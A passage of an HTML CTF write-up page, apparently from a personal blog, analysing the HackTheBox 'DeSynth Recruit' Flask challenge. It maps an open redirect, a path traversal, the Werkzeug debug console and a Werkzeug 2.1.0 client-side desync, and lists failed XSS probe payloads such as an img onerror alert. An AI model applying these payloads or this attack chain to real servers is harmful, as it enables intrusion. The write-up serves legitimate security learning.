@@ -1,0 +1,1503 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DeSynth Recruit — HTB CTF Writeup | Abdelaaziz Belkhair</title>
+    <meta name="description"
+        content="HTB CTF Writeup: DeSynth Recruit — Client-Side Desync via Werkzeug 2.1.0 to achieve XSS as admin, read system files, compute the debug PIN, and get RCE.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
+        integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg=="
+        crossorigin="anonymous" referrerpolicy="no-referrer">
+    <style>
+        :root {
+            --primary: #00d4ff;
+            --accent: #ff6b6b;
+            --success: #00ff88;
+            --bg: #0a0a0a;
+            --bg-card: #111111;
+            --bg-terminal: #0d0d0d;
+            --text: #e4e4e7;
+            --text-secondary: #a1a1aa;
+            --text-muted: #71717a;
+            --border: #27272a;
+            --orange: #f97316;
+            --purple: #a78bfa;
+        }
+
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.8;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        a {
+            color: var(--primary);
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        a:hover {
+            color: var(--success);
+        }
+
+        header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 100;
+            background: rgba(10, 10, 10, 0.95);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--border);
+        }
+
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 24px;
+            max-width: 1100px;
+            margin: 0 auto;
+        }
+
+        .logo {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: var(--primary);
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 1.75rem;
+            list-style: none;
+        }
+
+        .nav-links a {
+            color: var(--text-secondary);
+            font-weight: 500;
+        }
+
+        .nav-links a:hover {
+            color: var(--primary);
+        }
+
+        main {
+            padding-top: 100px;
+            padding-bottom: 60px;
+        }
+
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: var(--text-secondary);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .back-link:hover {
+            color: var(--primary);
+        }
+
+        .challenge-card {
+            background: linear-gradient(135deg, rgba(249, 115, 22, 0.08) 0%, rgba(0, 212, 255, 0.04) 100%);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 2rem 2.5rem;
+            margin-bottom: 2rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .challenge-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--orange), var(--primary), var(--purple));
+        }
+
+        .challenge-card::after {
+            content: '';
+            position: absolute;
+            top: -60px;
+            right: -60px;
+            width: 180px;
+            height: 180px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(249, 115, 22, 0.08) 0%, transparent 70%);
+            pointer-events: none;
+        }
+
+        .challenge-platform {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            color: var(--success);
+            background: rgba(0, 255, 136, 0.1);
+            padding: 0.3rem 0.75rem;
+            border-radius: 20px;
+            margin-bottom: 1rem;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        .challenge-title {
+            font-size: 2.2rem;
+            font-weight: 700;
+            line-height: 1.2;
+            margin-bottom: 0.5rem;
+            background: linear-gradient(135deg, var(--text) 0%, var(--text-secondary) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .challenge-subtitle {
+            color: var(--text-secondary);
+            font-size: 1.05rem;
+            margin-bottom: 1.5rem;
+            max-width: 650px;
+        }
+
+        .challenge-meta {
+            display: flex;
+            gap: 0.6rem;
+            flex-wrap: wrap;
+            margin-bottom: 1.5rem;
+        }
+
+        .meta-badge {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.7rem;
+            padding: 0.3rem 0.7rem;
+            border-radius: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+            font-weight: 600;
+        }
+
+        .meta-badge.date {
+            color: var(--primary);
+            background: rgba(0, 212, 255, 0.12);
+        }
+
+        .meta-badge.category {
+            color: var(--purple);
+            background: rgba(167, 139, 250, 0.12);
+        }
+
+        .meta-badge.tag {
+            color: var(--orange);
+            background: rgba(249, 115, 22, 0.12);
+        }
+
+        .challenge-stats {
+            display: flex;
+            gap: 1px;
+            background: var(--border);
+            border-radius: 12px;
+            overflow: hidden;
+            margin-top: 0.5rem;
+        }
+
+        .stat-item {
+            flex: 1;
+            padding: 1rem;
+            text-align: center;
+            background: var(--bg-card);
+        }
+
+        .stat-item:first-child {
+            border-radius: 12px 0 0 12px;
+        }
+
+        .stat-item:last-child {
+            border-radius: 0 12px 12px 0;
+        }
+
+        .stat-value {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.3rem;
+            font-weight: 700;
+            display: block;
+        }
+
+        .stat-value.difficulty-medium {
+            color: var(--orange);
+        }
+
+        .stat-value.difficulty-hard {
+            color: var(--accent);
+        }
+
+        .stat-value.difficulty-easy {
+            color: var(--success);
+        }
+
+        .stat-value.impact {
+            color: var(--accent);
+        }
+
+        .stat-value.vulns {
+            color: var(--primary);
+        }
+
+        .stat-label {
+            font-size: 0.7rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-top: 0.25rem;
+        }
+
+        .toc {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 1.25rem 1.5rem;
+            margin-bottom: 2rem;
+        }
+
+        .toc-title {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 0.75rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .toc-title::before {
+            content: '';
+            width: 12px;
+            height: 2px;
+            background: var(--orange);
+        }
+
+        .toc ol {
+            list-style: none;
+            counter-reset: toc-counter;
+            padding: 0;
+            margin: 0;
+        }
+
+        .toc li {
+            counter-increment: toc-counter;
+            margin-bottom: 0.25rem;
+        }
+
+        .toc li a {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            color: var(--text-secondary);
+            font-size: 0.85rem;
+            padding: 0.35rem 0.5rem;
+            border-radius: 6px;
+            transition: all 0.15s;
+        }
+
+        .toc li a:hover {
+            color: var(--orange);
+            background: rgba(249, 115, 22, 0.06);
+        }
+
+        .toc li a::before {
+            content: counter(toc-counter, decimal-leading-zero);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.7rem;
+            color: var(--text-muted);
+            min-width: 20px;
+        }
+
+        .article-content h2 {
+            font-size: 1.35rem;
+            margin: 2.5rem 0 1rem;
+            color: var(--text);
+            padding-bottom: 0.6rem;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        .article-content h2::before {
+            content: '';
+            width: 4px;
+            height: 22px;
+            background: var(--orange);
+            border-radius: 2px;
+            flex-shrink: 0;
+        }
+
+        .article-content h3 {
+            font-size: 1.1rem;
+            margin: 1.5rem 0 0.75rem;
+            color: var(--text);
+        }
+
+        .article-content h4 {
+            font-size: 0.95rem;
+            margin: 1.25rem 0 0.5rem;
+            color: var(--text-secondary);
+        }
+
+        .article-content p {
+            margin-bottom: 1rem;
+            color: var(--text-secondary);
+        }
+
+        .article-content ul,
+        .article-content ol {
+            margin: 1rem 0;
+            padding-left: 1.5rem;
+            color: var(--text-secondary);
+        }
+
+        .article-content li {
+            margin-bottom: 0.5rem;
+        }
+
+        .article-content pre {
+            background: var(--bg-terminal);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 1.25rem;
+            overflow-x: auto;
+            margin: 1.5rem 0;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            line-height: 1.6;
+            position: relative;
+        }
+
+        .article-content pre::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, var(--orange) 0%, transparent 100%);
+            border-radius: 10px 10px 0 0;
+        }
+
+        .article-content code {
+            font-family: 'JetBrains Mono', monospace;
+            background: rgba(249, 115, 22, 0.1);
+            padding: 0.15rem 0.45rem;
+            border-radius: 4px;
+            font-size: 0.83em;
+            color: var(--orange);
+        }
+
+        .article-content pre code {
+            background: none;
+            padding: 0;
+            color: var(--text-secondary);
+        }
+
+        .info-box {
+            background: rgba(0, 212, 255, 0.06);
+            border: 1px solid rgba(0, 212, 255, 0.15);
+            border-left: 3px solid var(--primary);
+            padding: 1.25rem 1.5rem;
+            border-radius: 0 10px 10px 0;
+            margin: 1.5rem 0;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        .warning-box {
+            background: rgba(255, 107, 107, 0.06);
+            border: 1px solid rgba(255, 107, 107, 0.15);
+            border-left: 3px solid var(--accent);
+            padding: 1.25rem 1.5rem;
+            border-radius: 0 10px 10px 0;
+            margin: 1.5rem 0;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: separate;
+            border-spacing: 0;
+            margin: 1.5rem 0;
+            font-size: 0.85rem;
+            border-radius: 10px;
+            overflow: hidden;
+            border: 1px solid var(--border);
+        }
+
+        th,
+        td {
+            padding: 0.7rem 1rem;
+            text-align: left;
+        }
+
+        th {
+            background: var(--bg-terminal);
+            color: var(--primary);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.78rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        td {
+            color: var(--text-secondary);
+            border-bottom: 1px solid rgba(39, 39, 42, 0.5);
+        }
+
+        tr:last-child td {
+            border-bottom: none;
+        }
+
+        tr:hover td {
+            background: rgba(249, 115, 22, 0.03);
+        }
+
+        td code {
+            font-size: 0.8em;
+        }
+
+        hr {
+            border: none;
+            border-top: 1px solid var(--border);
+            margin: 2rem 0;
+        }
+
+        .pwned-banner {
+            text-align: center;
+            padding: 2.5rem 2rem;
+            margin: 3rem 0 1rem;
+            background: linear-gradient(135deg, rgba(0, 255, 136, 0.06) 0%, rgba(0, 212, 255, 0.04) 100%);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            border-radius: 16px;
+            position: relative;
+        }
+
+        .pwned-banner::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--success), var(--primary));
+        }
+
+        .pwned-icon {
+            font-size: 2.5rem;
+            margin-bottom: 0.75rem;
+            display: block;
+        }
+
+        .pwned-text {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--success);
+            text-transform: uppercase;
+            letter-spacing: 3px;
+        }
+
+        .pwned-sub {
+            color: var(--text-muted);
+            font-size: 0.85rem;
+            margin-top: 0.5rem;
+        }
+
+        footer {
+            padding: 1.5rem 0;
+            border-top: 1px solid var(--border);
+            text-align: center;
+        }
+
+        footer p {
+            color: var(--text-muted);
+            font-size: 0.8rem;
+        }
+
+        @media (max-width: 768px) {
+            .nav-links {
+                display: none;
+            }
+
+            .challenge-title {
+                font-size: 1.6rem;
+            }
+
+            .challenge-card {
+                padding: 1.5rem;
+            }
+
+            .challenge-stats {
+                flex-wrap: wrap;
+            }
+
+            .stat-item {
+                min-width: 80px;
+            }
+
+            table {
+                font-size: 0.75rem;
+            }
+
+            th,
+            td {
+                padding: 0.4rem 0.6rem;
+            }
+
+            .toc {
+                display: none;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <nav>
+            <a href="../index.html" class="logo">AB_</a>
+            <ul class="nav-links">
+                <li><a href="../index.html">Accueil</a></li>
+                <li><a href="../blog.html">Blog</a></li>
+                <li><a href="../writeups.html">Writeups</a></li>
+                <li><a href="../index.html#contact">Contact</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main class="container">
+        <a href="../writeups.html" class="back-link"><i class="fas fa-arrow-left"></i> Retour aux writeups</a>
+
+        <article>
+            <div class="challenge-card">
+                <span class="challenge-platform"><i class="fas fa-flag"></i> HackTheBox CTF</span>
+                <h1 class="challenge-title">DeSynth Recruit</h1>
+                <p class="challenge-subtitle">
+                    Chaining a Client-Side Desync in Werkzeug 2.1.0 with an open redirect, path traversal, and the
+                    Werkzeug debug console to achieve full RCE on the target.
+                </p>
+                <div class="challenge-meta">
+                    <span class="meta-badge date"><i class="fas fa-calendar"></i> 2026-02-19</span>
+                    <span class="meta-badge category">Web Exploitation</span>
+                    <span class="meta-badge tag">CSD</span>
+                    <span class="meta-badge tag">XSS</span>
+                    <span class="meta-badge tag">Path Traversal</span>
+                    <span class="meta-badge tag">RCE</span>
+                    <span class="meta-badge tag">Request Smuggling</span>
+                </div>
+                <div class="challenge-stats">
+                    <div class="stat-item">
+                        <span class="stat-value difficulty-medium">Medium</span>
+                        <span class="stat-label">Difficulty</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-value vulns">5</span>
+                        <span class="stat-label">Vulns Chained</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-value impact">RCE</span>
+                        <span class="stat-label">Impact</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-value difficulty-medium">Flask/Python</span>
+                        <span class="stat-label">Stack</span>
+                    </div>
+                </div>
+            </div>
+
+            <nav class="toc">
+                <div class="toc-title">Table of Contents</div>
+                <ol>
+                    <li><a href="#s1">Architecture Overview</a></li>
+                    <li><a href="#s2">Reconnaissance</a></li>
+                    <li><a href="#s3">Source Code Analysis</a></li>
+                    <li><a href="#s4">The Rabbit Hole - Every Failed XSS Attempt</a></li>
+                    <li><a href="#s5">The Breakthrough - Client-Side Desync</a></li>
+                    <li><a href="#s6">Building the Exploit</a></li>
+                    <li><a href="#s7">Exploitation</a></li>
+                    <li><a href="#s8">Attack Chain Summary</a></li>
+                    <li><a href="#s9">Why Other Approaches Failed</a></li>
+                    <li><a href="#s10">Key Takeaways</a></li>
+                    <li><a href="#s11">Remediation</a></li>
+                </ol>
+            </nav>
+
+            <div class="article-content">
+
+                <div class="info-box">
+                    <strong>Challenge</strong>: DeSynth Recruit (web_desynth_recruit)<br>
+                    <strong>Category</strong>: Web Exploitation<br>
+                    <strong>Difficulty</strong>: Medium<br>
+                    <strong>Author</strong>: Xclow3n<br>
+                    <strong>Flag</strong>: <code>HTB{REDACTED}</code><br>
+                    <strong>Stack</strong>: Flask / MySQL / JWT / Selenium (headless Chromium)
+                </div>
+
+                <p>This challenge taught me an important lesson about where to look first: the vulnerability was hiding
+                    in a version number, not in the application code. I spent a long time hunting XSS through templates
+                    and JavaScript before realizing the real attack surface was the web server itself. Here is how I
+                    eventually got there.</p>
+
+                <h2 id="s1">1. Architecture Overview</h2>
+
+                <p>The application is a Flask web app backed by MySQL, using JWT for authentication and Selenium
+                    (headless Chromium) to simulate an admin bot that reviews reported users.</p>
+
+                <pre><code>+--------------------------------------------------------------+
+|                   FLASK (:1337)                              |
+|                                                              |
+|  /                    -> Landing page (GET + POST)           |
+|  /login               -> Login page                          |
+|  /register            -> Registration page                   |
+|  /profile/&lt;uid&gt;       -> View user profile                   |
+|  /settings            -> Edit user profile                   |
+|  /ipc_documents       -> Admin-only: view IPC submissions    |
+|  /go?to=&lt;url&gt;         -> Open redirect                       |
+|                                                              |
+|  /api/register        -> Create account                      |
+|  /api/login           -> Authenticate, get JWT session       |
+|  /api/profile/me/update -> Update profile fields             |
+|  /api/report          -> Report user (triggers admin bot)    |
+|  /api/ipc_submit      -> Upload .png file                    |
+|  /api/ipc_download    -> Admin-only: download IPC file       |
+|                                                              |
+|  Auth: JWT (HS256, runtime-generated secret)                 |
+|  Bot: Selenium (headless Chromium)                           |
+|  CSP: None                                                   |
+|  Debug: Werkzeug debugger enabled (/console)                 |
++--------------------------------------------------------------+</code></pre>
+
+                <h3>Flag Location</h3>
+
+                <p>From <code>entrypoint.sh</code>, the flag is copied to <code>/flag.txt</code> by the Dockerfile, then
+                    renamed at startup to something like <code>/flag3a8b7c1d2e.txt</code>. Even if arbitrary file read
+                    were possible, discovering the randomized name would require <code>cat /flag*.txt</code> or
+                    <code>os.listdir('/')</code>.</p>
+
+                <pre><code># entrypoint.sh
+mv /flag.txt /flag$(cat /dev/urandom | tr -cd 'a-f0-9' | head -c 10).txt</code></pre>
+
+                <h2 id="s2">2. Reconnaissance</h2>
+
+                <h3>Tech Stack Fingerprinting</h3>
+
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Component</th>
+                            <th>Details</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Runtime</td>
+                            <td>Python 3.11 (Alpine)</td>
+                        </tr>
+                        <tr>
+                            <td>Framework</td>
+                            <td>Flask 2.1.0</td>
+                        </tr>
+                        <tr>
+                            <td>WSGI Server</td>
+                            <td>Werkzeug 2.1.0 (development server)</td>
+                        </tr>
+                        <tr>
+                            <td>Template Engine</td>
+                            <td>Jinja2 3.1.2 (autoescape enabled)</td>
+                        </tr>
+                        <tr>
+                            <td>Auth</td>
+                            <td>PyJWT (HS256, <code>os.urandom(50).hex()</code> secret)</td>
+                        </tr>
+                        <tr>
+                            <td>Database</td>
+                            <td>MySQL (flask_mysqldb, mysqlclient 2.1.1)</td>
+                        </tr>
+                        <tr>
+                            <td>Bot</td>
+                            <td>Selenium + headless Chromium</td>
+                        </tr>
+                        <tr>
+                            <td>Upload</td>
+                            <td><code>.png</code> only, saved as <code>&lt;username&gt;.png</code></td>
+                        </tr>
+                        <tr>
+                            <td>CSP</td>
+                            <td><strong>None</strong> - no Content-Security-Policy headers whatsoever</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h3>Initial Attack Surface Mapping</h3>
+
+                <p>After reading through every file, several things jumped out immediately.</p>
+
+                <p><strong>The bot visits profiles.</strong> The <code>/api/report</code> endpoint takes an ID and makes
+                    the admin bot navigate to <code>http://localhost:1337/profile/{id}</code>. A bot visiting
+                    user-controlled pages is the classic setup for client-side attacks.</p>
+
+                <p><strong>No CSP.</strong> The Flask app sets zero Content-Security-Policy headers. No
+                    <code>default-src</code>, no <code>script-src</code>, nothing. Confirmed by checking
+                    <code>main.py</code>, <code>routes.py</code>, and every response-modifying function.</p>
+
+                <p><strong>An open redirect exists.</strong> The <code>/go</code> route does
+                    <code>redirect(request.args.get('to'))</code> with zero validation. Any URL, any scheme, no
+                    allowlist.</p>
+
+                <p><strong>Path traversal in <code>/api/ipc_download</code>.</strong> The admin-only file download
+                    endpoint builds its file path by directly concatenating <code>request.args.get("file")</code> onto
+                    the upload directory path. Classic path traversal, but it requires admin auth.</p>
+
+                <p><strong>Debug mode is on.</strong> <code>run.py</code> starts Flask with <code>debug=True</code>,
+                    which exposes a Werkzeug interactive console at <code>/console</code>. That is full RCE, if you know
+                    the PIN.</p>
+
+                <p>My working hypothesis at this point: XSS on the profile page -&gt; steal admin cookies -&gt; use the
+                    admin session to read files via the path traversal -&gt; profit. I was wrong.</p>
+
+                <h2 id="s3">3. Source Code Analysis</h2>
+
+                <h3>The Bot (bot.py)</h3>
+
+                <pre><code>def bot(id, username, password):
+    # ... Chrome setup ...
+    client.get(f"http://localhost:1337/login")
+    client.find_element(By.ID, "username").send_keys(username)
+    client.find_element(By.ID, "password").send_keys(password)
+    client.execute_script("document.getElementById('login-btn').click()")
+    time.sleep(3)
+    client.get(f"http://localhost:1337/profile/{id}")
+    time.sleep(10)
+    client.quit()</code></pre>
+
+                <p>The bot logs in as admin (password generated at runtime by <code>entrypoint.sh</code>), then visits
+                    <code>/profile/{id}</code>. The <code>id</code> comes directly from user input in the report -- no
+                    validation, no <code>int()</code> cast, no sanitization. It is just f-string interpolated into the
+                    URL.</p>
+
+                <h3>The Profile Rendering (profile.html)</h3>
+
+                <pre><code>&lt;h1&gt;{{ user.full_name }}&lt;/h1&gt;
+&lt;h2&gt;{{ user.qualification }} . {{ user.iexp }}+ years of experience&lt;/h2&gt;
+
+&lt;h5 class="bio-container"&gt;
+    {{ user.bio | e }}
+&lt;/h5&gt;
+
+&lt;div class="exp-container text-center" data-bot-exp="{{ user.bots }}"&gt;</code></pre>
+
+                <p>Flask enables Jinja2 autoescaping for <code>.html</code> templates by default, so <code>&lt;</code>,
+                    <code>&gt;</code>, <code>"</code>, <code>'</code>, and <code>&amp;</code> are all encoded as HTML
+                    entities. The <code>bio</code> field even has an explicit <code>| e</code> filter on top of
+                    autoescaping. There is no <code>| safe</code> filter anywhere, no
+                    <code>{% autoescape false %}</code> block, and no <code>Markup()</code> wrapping of user input in
+                    the Python code.</p>
+
+                <h3>The Bots JavaScript (profile.js)</h3>
+
+                <pre><code>const populateBots = () => {
+    let sBots = $('.exp-container').data('botExp');
+    let botsHTML = `&lt;div class="row justify-content-center"&gt;`;
+    for(i=0; i &lt; botsData.length; i++) {
+        if (sBots.includes(botsData[i].name)) {
+            botsHTML += `
+            &lt;div class='col-md-3 bots-col'&gt;
+                &lt;img src='${botsData[i].src}' class='bots-img'&gt;
+            &lt;/div&gt;`;
+        }
+    }
+    botsHTML += `&lt;/div&gt;`;
+    $('.exp-container').html(botsHTML);
+}</code></pre>
+
+                <p>jQuery's <code>.html()</code> is a classic DOM XSS sink. And <code>sBots.includes()</code> does
+                    substring matching when operating on a string. So if the bots string contains a valid bot name
+                    anywhere inside a larger payload, the <code>if</code> check passes and <code>.html()</code> fires.
+                    This looked like the injection point. It was a red herring.</p>
+
+                <h3>The f-string Conversion (database.py)</h3>
+
+                <pre><code>def update_profile_db(username, data):
+    data['bots'] = f'{data["bots"]}'
+    # ... SQL UPDATE ...</code></pre>
+
+                <p>This line converts the validated Python list (e.g., <code>["DisBot", "FBot"]</code>) into its string
+                    representation: <code>"['DisBot', 'FBot']"</code>. The schema validates each array item to be at
+                    most 10 characters, but the resulting string has no length limit and contains all items concatenated
+                    together. I thought I could spread a payload across multiple array items and stitch it into one
+                    continuous string in the database.</p>
+
+                <h2 id="s4">4. The Rabbit Hole - Every Failed XSS Attempt</h2>
+
+                <h3>Attempt 1: Direct &lt;script&gt; Tag in Bots Array</h3>
+
+                <pre><code>"bots": ["&lt;script&gt;/*", "*/alert(/*", "*/1)//"]</code></pre>
+
+                <p>Each item is at most 10 characters. After f-string conversion, the stored string would be
+                    <code>['&lt;script&gt;/*', '*/alert(/*', '*/1)//']</code>. The JavaScript comments were meant to
+                    bridge across the Python repr formatting. This failed because the <code>&lt;script&gt;</code> tag
+                    ends up inside a <code>data-</code> attribute. HTML parsers treat attribute values as plain text and
+                    do not parse tags inside attributes.</p>
+
+                <h3>Attempt 2: Attribute Breakout with Event Handlers</h3>
+
+                <pre><code>"bots": ["DisBot", "\"&gt;&lt;img on", "error=al", "ert(1) x="]</code></pre>
+
+                <p>The idea was to inject <code>"</code> to close the attribute, <code>&gt;</code> to close the div,
+                    then add an <code>&lt;img onerror=...&gt;</code> element. This failed because Jinja2 autoescaping
+                    encodes <code>"</code> to <code>&amp;#34;</code> and <code>&gt;</code> to <code>&amp;gt;</code>. The
+                    injected characters become harmless HTML entities in the source.</p>
+
+                <h3>Attempt 3: jQuery .data() Decoding Bypass</h3>
+
+                <p>When JavaScript reads a data attribute via <code>$('.exp-container').data('botExp')</code>, the
+                    browser decodes HTML entities back to their original characters. So <code>&amp;lt;</code> becomes
+                    <code>&lt;</code> again. The decoded string in JavaScript would have actual
+                    <code>&lt;script&gt;</code> tags. But I traced the flow carefully:</p>
+
+                <pre><code>let sBots = $('.exp-container').data('botExp');  // decoded, has real &lt; &gt;
+// ...
+botsHTML += `&lt;img src='${botsData[i].src}' class='bots-img'&gt;`;</code></pre>
+
+                <p>The content interpolated into <code>botsHTML</code> comes from <code>botsData[i].src</code> -- the
+                    hardcoded array defined in <code>global.js</code>. My user-controlled bots string determines which
+                    hardcoded images get added via the <code>includes()</code> check, but the actual content of
+                    <code>botsHTML</code> is never influenced by my input. The <code>.html()</code> sink exists, but my
+                    payload never reaches it.</p>
+
+                <h3>Attempt 4: Spreading a Larger Payload</h3>
+
+                <p>I tried manipulating the f-string conversion by inserting single quotes to force Python's repr to use
+                    double quotes for some items, potentially making the string parseable as JSON by jQuery's
+                    <code>.data()</code>. Same fundamental problem: even if jQuery parsed it as an array, the decoded
+                    value still never reaches any HTML rendering sink. No matter how elaborate the payload, the data
+                    flow is severed.</p>
+
+                <h3>Attempt 5: XSS Through Other Fields</h3>
+
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Field</th>
+                            <th>Rendering</th>
+                            <th>Escaped?</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>full_name</code></td>
+                            <td><code>{{ user.full_name }}</code></td>
+                            <td>Yes - Autoescaped</td>
+                        </tr>
+                        <tr>
+                            <td><code>qualification</code></td>
+                            <td><code>{{ user.qualification }}</code></td>
+                            <td>Yes - Autoescaped + enum constrained</td>
+                        </tr>
+                        <tr>
+                            <td><code>iexp</code></td>
+                            <td><code>{{ user.iexp }}</code></td>
+                            <td>Yes - Autoescaped</td>
+                        </tr>
+                        <tr>
+                            <td><code>bio</code></td>
+                            <td><code>{{ user.bio | e }}</code></td>
+                            <td>Yes - Explicitly escaped</td>
+                        </tr>
+                        <tr>
+                            <td><code>bots</code></td>
+                            <td><code>data-bot-exp="{{ user.bots }}"</code></td>
+                            <td>Yes - Autoescaped in attribute</td>
+                        </tr>
+                        <tr>
+                            <td><code>meta_desc</code></td>
+                            <td>Not rendered on profile page</td>
+                            <td>N/A</td>
+                        </tr>
+                        <tr>
+                            <td><code>meta_keywords</code></td>
+                            <td>Not rendered on profile page</td>
+                            <td>N/A</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <p>Every single field on the profile page is properly escaped. Jinja2 autoescaping is comprehensive.
+                    There is no <code>| safe</code> filter, no auto-escape disabled zone, no template string injection.
+                    The application layer is airtight.</p>
+
+                <div class="warning-box">
+                    <strong>Why I was stuck:</strong> I had spent a long time trying every angle on stored XSS through
+                    the application's templates and JavaScript. Every attempt hit the same wall: Jinja2 autoescaping
+                    prevents injection in the HTML context, and no user-controlled data reaches any DOM XSS sink. The
+                    <code>.html()</code> function was a red herring -- it is technically a sink, but no
+                    attacker-controlled data flows into it. I needed to step back and reconsider the entire approach.
+                </div>
+
+                <h2 id="s5">5. The Breakthrough - Client-Side Desync</h2>
+
+                <h3>Reframing the Problem</h3>
+
+                <p>I had been so focused on the application code that I had ignored the infrastructure. Going back to
+                    <code>requirements.txt</code> with fresh eyes, one line jumped out:</p>
+
+                <pre><code>Werkzeug==2.1.0</code></pre>
+
+                <p>That is a pinned version. In a CTF challenge, pinned dependency versions are deliberate signals. I
+                    researched Werkzeug 2.1.0 specifically and found that it is vulnerable to <strong>Client-Side
+                        Desync</strong> (CSD) -- a form of HTTP Request Smuggling that targets the browser's TCP
+                    connection. Suddenly, pieces that had not fit before snapped into place.</p>
+
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Clue</th>
+                            <th>Significance</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>Werkzeug==2.1.0</code> pinned</td>
+                            <td>This specific version has the CSD vulnerability</td>
+                        </tr>
+                        <tr>
+                            <td><code>methods=['GET', 'POST']</code> on <code>/</code></td>
+                            <td>The index route accepts POST -- a CSD prerequisite</td>
+                        </tr>
+                        <tr>
+                            <td>Bot's <code>id</code> is unvalidated</td>
+                            <td>Path traversal to reach <code>/go</code> from <code>/profile/{id}</code></td>
+                        </tr>
+                        <tr>
+                            <td><code>/go</code> open redirect</td>
+                            <td>Delivery mechanism to get the bot to the exploit page</td>
+                        </tr>
+                        <tr>
+                            <td><code>debug=True</code> in <code>run.py</code></td>
+                            <td>Werkzeug console at <code>/console</code> -- endgame RCE</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h3>Understanding Client-Side Desync</h3>
+
+                <p>CSD exploits a mismatch between how the browser and the server handle HTTP request bodies on
+                    keep-alive connections.</p>
+
+                <pre><code>+------------+                    +--------------+
+|  Browser   | --- TCP conn ---&gt; |  Werkzeug    |
+|  (Chrome)  |                    |  (2.1.0)     |
+|            |                    |              |
+|  1. POST / | ----------------&gt; | Process POST |
+|  body: smuggled GET             | Don't read   |
+|            |                    | full body    |
+|            | &lt;---------------- | Send response|
+|            |                    |              |
+|  2. GET /next-resource          | But buffer   |
+|     (automatic) -------------&gt; | still has    |
+|            |                    | smuggled GET |
+|            |                    | -&gt; process it|
+|            | &lt;---------------- | Smuggled resp|
+|            |                    |              |
+|  Browser receives smuggled      |              |
+|  response thinking it's the     |              |
+|  response to request #2         |              |
++------------+                    +--------------+</code></pre>
+
